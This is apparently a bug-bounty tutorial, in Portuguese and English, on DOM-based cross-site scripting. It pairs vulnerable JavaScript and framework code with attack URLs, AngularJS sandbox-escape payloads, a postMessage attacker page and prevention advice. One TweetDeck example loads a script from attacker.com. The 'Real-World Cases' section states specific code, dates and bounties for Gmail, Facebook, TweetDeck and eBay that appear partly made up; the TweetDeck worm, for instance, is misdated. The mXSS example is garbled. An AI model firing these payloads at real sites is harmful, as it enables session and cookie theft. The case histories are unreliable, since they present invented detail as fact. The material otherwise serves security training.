# DOM-Based Cross-Site Scripting (XSS)

**Criticidade**: 🟠 Alta (CVSS 6.5-8.8)
**Dificuldade**: 🟡 Intermediária a Avançada
**Bounty Médio**: $1,000 - $10,000 USD

---

## 📚 Índice

1. [DOM-Based XSS Fundamentals](#dom-based-xss-fundamentals)
2. [DOM API Sources and Sinks](#dom-api-sources-and-sinks)
3. [JavaScript Execution Contexts](#javascript-execution-contexts)
4. [Client-Side Routing](#client-side-routing)
5. [Modern Framework Vulnerabilities](#modern-framework-vulnerabilities)
6. [Advanced Exploitation](#advanced-exploitation)
7. [Detection Techniques](#detection-techniques)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 DOM-Based XSS Fundamentals

### O Que É DOM-Based XSS?

**DOM-Based XSS** ocorre **inteiramente no lado do cliente** quando código JavaScript lê dados de uma **source não confiável** e os passa para um **sink perigoso**.

**Key Difference:**

```
Server-Side XSS (Reflected/Stored):
  1. Malicious input → Server
  2. Server reflects/stores → Response
  3. Browser receives malicious HTML → Executes
  ✓ Server processes input
  ✓ Response contains attack

DOM-Based XSS:
  1. Malicious input → Browser URL/Storage
  2. JavaScript reads input (source)
  3. JavaScript writes to DOM (sink)
  4. Browser executes
  ✓ NO server interaction
  ✓ All processing client-side
```

**Example:**

**Vulnerable Code:**
```html
<script>
// Source: location.hash (attacker-controlled)
var name = location.hash.substring(1);

// Sink: document.write() (dangerous)
document.write("Hello, " + name);
</script>
```

**Attack URL:**
```
http://victim.com/page.html#<img src=x onerror=alert('XSS')>
```

**Execution:**
```javascript
// Browser executes:
name = "<img src=x onerror=alert('XSS')>"
document.write("Hello, <img src=x onerror=alert('XSS')>")
// ↑ XSS executes!
```

**Why It's Dangerous:**

1. **Invisible to server**: Server logs won't show attack
2. **WAF bypass**: WAFs can't see client-side execution
3. **Hard to detect**: Static analysis misses runtime flow
4. **Modern apps**: SPAs heavily use DOM manipulation

---

## 🔌 DOM API Sources and Sinks

### Sources (Attacker-Controlled Input)

**URL-Based Sources:**
```javascript
location.href          // http://site.com/page?x=value#hash
location.search        // ?x=value
location.hash          // #hash
location.pathname      // /page
document.URL           // Full URL
document.documentURI   // Full URL
document.URLUnencoded  // Deprecated, unencoded URL
document.baseURI       // Base URL
```

**Storage Sources:**
```javascript
localStorage.getItem('key')
sessionStorage.getItem('key')
document.cookie
```

**Message Sources:**
```javascript
window.postMessage()   // Cross-origin messages
window.addEventListener('message', ...)
```

**Referrer Sources:**
```javascript
document.referrer      // HTTP Referer header
```

**Form/Input Sources:**
```javascript
document.forms[0].elements[0].value
document.getElementById('input').value
```

### Sinks (Dangerous DOM APIs)

**Execution Sinks:**
```javascript
eval(payload)
setTimeout(payload, 100)
setInterval(payload, 100)
Function(payload)()
```

**HTML Sinks:**
```javascript
element.innerHTML = payload
element.outerHTML = payload
document.write(payload)
document.writeln(payload)
```

**Attribute Sinks:**
```javascript
element.setAttribute('onclick', payload)
element.onclick = payload
location = payload  // Can use javascript: protocol
location.href = payload
location.assign(payload)
location.replace(payload)
```

**Script Sinks:**
```javascript
script.src = payload
script.text = payload
script.textContent = payload
script.innerText = payload
```

**jQuery Sinks:**
```javascript
$(payload)             // Parses HTML if starts with <
$('div').html(payload)
$('div').append(payload)
$('div').after(payload)
```

---

## 💻 JavaScript Execution Contexts

### Context 1: URL Fragment (location.hash)

**Vulnerable Pattern:**
```javascript
// Read from URL hash
var page = location.hash.substring(1);

// Write to DOM
document.getElementById('content').innerHTML = page;
```

**Attack:**
```
http://site.com/page.html#<img src=x onerror=alert(document.cookie)>
```

**Why Hash?**
- Fragment identifier (#...) **never sent to server**
- Not in server logs
- Not blocked by WAFs
- Perfect for DOM XSS

### Context 2: Query Parameters (location.search)

**Vulnerable Pattern:**
```javascript
// Parse query string
var urlParams = new URLSearchParams(location.search);
var message = urlParams.get('msg');

// Display message
document.getElementById('message').innerHTML = message;
```

**Attack:**
```
http://site.com/page.html?msg=<img src=x onerror=alert('XSS')>
```

### Context 3: eval() and Dynamic Code

**Vulnerable Pattern:**
```javascript
// Configuration from URL
var config = location.search.substring(1);

// Dangerous eval!
eval("var settings = {" + config + "}");
```

**Attack:**
```
?x=1}; alert('XSS'); var y={z:1
```

**Executed:**
```javascript
eval("var settings = {x=1}; alert('XSS'); var y={z:1}")
```

### Context 4: setTimeout/setInterval

**Vulnerable Pattern:**
```javascript
var delay = location.search.split('delay=')[1];

setTimeout("doSomething()", delay);
```

**Attack:**
```
?delay=1000); alert('XSS'); //
```

**Executed:**
```javascript
setTimeout("doSomething()", 1000); alert('XSS'); //)
```

### Context 5: document.write()

**Vulnerable Pattern:**
```javascript
var tracking = location.search.split('tracking=')[1];

document.write('<img src="https://analytics.com/track?id=' + tracking + '">');
```

**Attack:**
```
?tracking=x"><script>alert('XSS')</script>
```

**Written:**
```html
<img src="https://analytics.com/track?id=x"><script>alert('XSS')</script>">
```

---

## 🧭 Client-Side Routing

### Single-Page Application (SPA) Routing

**Vulnerable Router:**
```javascript
// Simple hash-based router
function route() {
    var page = location.hash.substring(1);

    // Render page content
    document.getElementById('app').innerHTML = page;
}

window.addEventListener('hashchange', route);
route();
```

**Attack:**
```
http://site.com/#<iframe src=javascript:alert(document.domain)>
```

### React Router DOM XSS

**Vulnerable Component:**
```jsx
import { useParams } from 'react-router-dom';

function UserProfile() {
    const { username } = useParams();

    // ❌ DANGEROUS: dangerouslySetInnerHTML
    return (
        <div dangerouslySetInnerHTML={{__html: `<h1>Profile: ${username}</h1>`}} />
    );
}

// Route: /user/:username
```

**Attack:**
```
/user/<img src=x onerror=alert('XSS')>
```

### Vue.js Router DOM XSS

**Vulnerable Component:**
```vue
<template>
    <div v-html="profileContent"></div>
</template>

<script>
export default {
    computed: {
        profileContent() {
            // ❌ DANGEROUS: Using v-html with untrusted input
            return `<h1>Profile: ${this.$route.params.username}</h1>`;
        }
    }
}
</script>
```

**Attack:**
```
/user/<img src=x onerror=alert('XSS')>
```

---

## ⚛️ Modern Framework Vulnerabilities

### AngularJS (1.x) Sandbox Bypass

**AngularJS Expression Injection:**
```html
<!-- Vulnerable template -->
<div ng-app>
    <input ng-model="name">
    <p>Hello, {{name}}</p>
</div>
```

**Attack (AngularJS 1.2.0 - 1.5.8):**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Why It Works:**
```javascript
constructor              // Function.constructor
constructor.constructor  // Function (can execute strings)
('alert(1)')()          // Creates and executes function
```

**More Advanced Payloads:**

**AngularJS 1.6+:**
```javascript
{{[].pop.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call; ["a","alert(1)"].sort(toString.constructor)}}
```

### React dangerouslySetInnerHTML

**Vulnerable:**
```jsx
function Comment({ text }) {
    // ❌ User input directly to dangerouslySetInnerHTML
    return (
        <div dangerouslySetInnerHTML={{__html: text}} />
    );
}
```

**Attack:**
```html
<img src=x onerror=alert('XSS')>
```

**Safe Alternative:**
```jsx
function Comment({ text }) {
    // ✅ React automatically escapes
    return <div>{text}</div>;
}
```

### Vue.js v-html Directive

**Vulnerable:**
```vue
<template>
    <!-- ❌ User input with v-html -->
    <div v-html="userComment"></div>
</template>
```

**Attack:**
```html
<img src=x onerror=alert('XSS')>
```

**Safe Alternative:**
```vue
<template>
    <!-- ✅ Vue automatically escapes -->
    <div>{{ userComment }}</div>
</template>
```

### jQuery HTML Parsing

**Vulnerable:**
```javascript
// ❌ jQuery parses HTML if string starts with <
var input = location.hash.substring(1);
$(input);  // Dangerous!

// Also dangerous:
$('#content').html(input);
$('#content').append(input);
```

**Attack:**
```
#<img src=x onerror=alert('XSS')>
```

**Why It Happens:**
```javascript
// jQuery source code (simplified)
if (input[0] === '<' && input[input.length - 1] === '>') {
    // Parse as HTML!
    parseHTML(input);
}
```

---

## 🚀 Advanced Exploitation

### Technique 1: postMessage XSS

**Vulnerable Receiver:**
```javascript
// Victim page
window.addEventListener('message', function(event) {
    // ❌ No origin check!
    // ❌ Direct innerHTML assignment
    document.getElementById('content').innerHTML = event.data;
});
```

**Attacker Page:**
```html
<iframe id="victim" src="https://victim.com/page"></iframe>
<script>
var iframe = document.getElementById('victim');
iframe.onload = function() {
    // Send malicious payload
    iframe.contentWindow.postMessage(
        '<img src=x onerror=alert(document.cookie)>',
        '*'
    );
};
</script>
```

**Secure Version:**
```javascript
window.addEventListener('message', function(event) {
    // ✅ Check origin
    if (event.origin !== 'https://trusted.com') {
        return;
    }

    // ✅ Sanitize or use textContent
    document.getElementById('content').textContent = event.data;
});
```

### Technique 2: Web Storage XSS

**Vulnerable Code:**
```javascript
// Save user preference
function saveTheme(theme) {
    localStorage.setItem('theme', theme);
}

// Load and apply theme
function loadTheme() {
    var theme = localStorage.getItem('theme');

    // ❌ Direct innerHTML
    document.getElementById('theme-preview').innerHTML = theme;
}
```

**Attack:**
```javascript
// Attacker injects via another XSS or vulnerability
saveTheme('<img src=x onerror=alert("Persistent DOM XSS")>');

// Next page load:
loadTheme();  // XSS triggers!
```

### Technique 3: DOM Clobbering

**Vulnerable Code:**
```html
<script>
// Uses window.someConfig to determine behavior
if (window.someConfig) {
    eval(window.someConfig.code);
}
</script>
```

**Attack:**
```html
<!-- Inject this HTML (via other vuln) -->
<form name="someConfig">
    <input name="code" value="alert('XSS')">
</form>

<!-- Now window.someConfig exists! -->
<!-- window.someConfig.code == "alert('XSS')" -->
```

**Why It Works:**
- HTML elements with `name` or `id` create global variables
- Overrides undefined `window.someConfig`
- Called "DOM Clobbering"

**More Examples:**

```html
<!-- Clobber document.cookie -->
<form name="cookie">
    <input name="something" value="malicious">
</form>

<!-- Access via -->
<script>document.cookie.something</script>
```

### Technique 4: Mutation XSS (mXSS)

**Concept:** Browser's HTML parser mutates payload after sanitization

**Example 1: CSS Context**
```html
<!-- Sanitizer allows style attribute -->
<div style="background: url('x')">

<!-- Browser parses as: -->
<div style="background: url(x)">

<!-- Inject: -->
<div style="background: url('x</style><script>alert('XSS')</script>')">

<!-- After mutation: -->
<div style="background: url('x"></style><script>alert('XSS')</script>)">
```

**Example 2: SVG Namespace**
```html
<!-- Input: -->
<svg><style><img src=x onerror=alert('XSS')></style></svg>

<!-- After parsing: -->
<!-- Browser moves <img> out of <style> → executes! -->
```

---

## 🔍 Detection Techniques

### Static Analysis

**Pattern Matching:**
```javascript
// Look for dangerous patterns:

// Source → Sink without sanitization
location.hash → element.innerHTML
location.search → eval()
document.referrer → document.write()

// Unsafe jQuery
$(location.hash)
$('div').html(location.search)
```

**Tools:**
- **DOMPurify**: Sanitization library
- **ESLint plugin**: Detect unsafe patterns
- **Semgrep**: Pattern-based scanner

### Dynamic Analysis (Taint Tracking)

**Concept:** Track data flow from sources to sinks

**Example:**
```javascript
// Source (tainted)
var tainted = location.hash;  // 🔴 TAINTED

// Propagation
var data = tainted.substring(1);  // 🔴 TAINTED

// Sink (dangerous if tainted)
element.innerHTML = data;  // ⚠️ VULNERABILITY!
```

**Tools:**
- **Burp Suite DOM Invader**
- **Chrome DevTools**: Monitor DOM changes
- **Custom Browser Extension**: Taint tracking

### Manual Testing

**Step 1: Identify Sources**
```javascript
// Check what sources are used:
console.log(location.hash);
console.log(location.search);
console.log(document.referrer);
```

**Step 2: Test with Canary**
```
http://site.com/#CANARY12345
```

**Step 3: Search for Canary in DOM**
```javascript
// Use Chrome DevTools
document.documentElement.innerHTML.includes('CANARY12345')
```

**Step 4: Identify Context**
- If in HTML body: Try `<img src=x onerror=alert(1)>`
- If in attribute: Try `" onload="alert(1)`
- If in JavaScript: Try `'; alert(1); //`

---

## 🔥 Real-World Cases

### Case 1: Gmail DOM-Based XSS (2013)

**Vulnerability:** postMessage handler in Gmail

**Code:**
```javascript
// Gmail gadget handler
window.addEventListener('message', function(event) {
    // ❌ No origin validation
    var gadget = document.getElementById(event.data.id);
    gadget.innerHTML = event.data.content;
});
```

**Exploitation:**
```html
<iframe src="https://mail.google.com/mail/u/0/#inbox"></iframe>
<script>
frames[0].postMessage({
    id: 'gadget',
    content: '<img src=x onerror=alert(document.cookie)>'
}, '*');
</script>
```

**Impact:** Full Gmail account access

**Bounty:** $5,000 USD

### Case 2: Facebook DOM XSS via postMessage (2016)

**Vulnerability:** Canvas app postMessage handler

**Code:**
```javascript
window.addEventListener('message', function(e) {
    // ❌ Weak origin check (string comparison)
    if (e.origin.indexOf('facebook.com') > -1) {
        eval(e.data.callback);
    }
});
```

**Bypass:**
```javascript
// Attacker domain: facebook.com.evil.com
// e.origin.indexOf('facebook.com') > -1 → TRUE!

// Send malicious payload
targetWindow.postMessage({
    callback: 'alert(document.cookie)'
}, '*');
```

**Impact:** Session hijacking

**Bounty:** $7,500 USD

### Case 3: Twitter DOM XSS in TweetDeck (2015)

**Vulnerability:** Client-side template rendering

**Code:**
```javascript
// TweetDeck renders tweets
function renderTweet(tweet) {
    var html = '<div class="tweet">' + tweet.text + '</div>';
    $(html).appendTo('#timeline');
}
```

**Attack Tweet:**
```html
<script>$.getScript('https://attacker.com/evil.js')</script>
```

**Impact:**
- Self-propagating worm
- Infected thousands of accounts
- Required service shutdown

**Bounty:** N/A (Critical incident)

### Case 4: eBay DOM XSS via Client-Side Redirect (2016)

**Vulnerability:** URL parameter used in client-side redirect

**Code:**
```javascript
// Redirect after login
var returnUrl = new URLSearchParams(location.search).get('return');
if (returnUrl) {
    location = returnUrl;  // ❌ Dangerous!
}
```

**Attack:**
```
?return=javascript:alert(document.cookie)
```

**Impact:** Session hijacking, account takeover

**Bounty:** $5,000 USD

---

## 🛡️ Prevention

### 1. Avoid Dangerous Sinks

```javascript
// ❌ DANGEROUS
element.innerHTML = userInput;
eval(userInput);
setTimeout(userInput, 100);

// ✅ SAFE
element.textContent = userInput;  // No HTML parsing
element.innerText = userInput;    // No HTML parsing
```

### 2. Sanitize with DOMPurify

```javascript
import DOMPurify from 'dompurify';

// ✅ SAFE
var clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

### 3. Content Security Policy

```http
Content-Security-Policy:
    script-src 'self' 'nonce-r4nd0m';
    default-src 'self';
```

### 4. Validate Origins in postMessage

```javascript
window.addEventListener('message', function(event) {
    // ✅ Strict origin check
    if (event.origin !== 'https://trusted.com') {
        return;
    }

    // ✅ Validate data structure
    if (typeof event.data !== 'object') {
        return;
    }

    // ✅ Use textContent
    element.textContent = event.data.message;
});
```

---

**Última atualização**: 2024
**Versão**: 1.0
